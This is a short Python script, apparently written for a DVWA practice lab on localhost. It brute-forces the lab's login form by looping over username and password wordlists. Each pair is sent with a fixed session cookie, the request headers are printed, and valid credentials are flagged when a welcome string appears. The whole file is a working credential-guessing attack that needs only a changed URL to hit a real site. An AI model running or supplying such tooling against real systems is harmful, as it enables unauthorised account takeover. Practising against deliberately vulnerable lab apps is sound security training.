import requests

url = "http://localhost:8081/vulnerabilities/brute/"

cookies = {
    "PHPSESSID": "cfa00dc4230a385abf32ecd3407a85d1", 
    "security": "low"
}

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*"
}

with open("usuarios.txt", "r") as ufile, open("passwords.txt", "r") as pfile:
    usuarios = [u.strip() for u in ufile]
    passwords = [p.strip() for p in pfile]

for usuario in usuarios:
    for password in passwords:
        params = {
            "username": usuario,
            "password": password,
            "Login": "Login"
        }

        response = requests.get(url, params=params, headers=headers, cookies=cookies)

        print(f"Enviando: {usuario}:{password}")
        print("→ Cabeceras enviadas:")
        print(response.request.headers)
        print("---")

        if "Welcome to the password protected area" in response.text:
            print(f"✅ VÁLIDO: {usuario}:{password}\n")
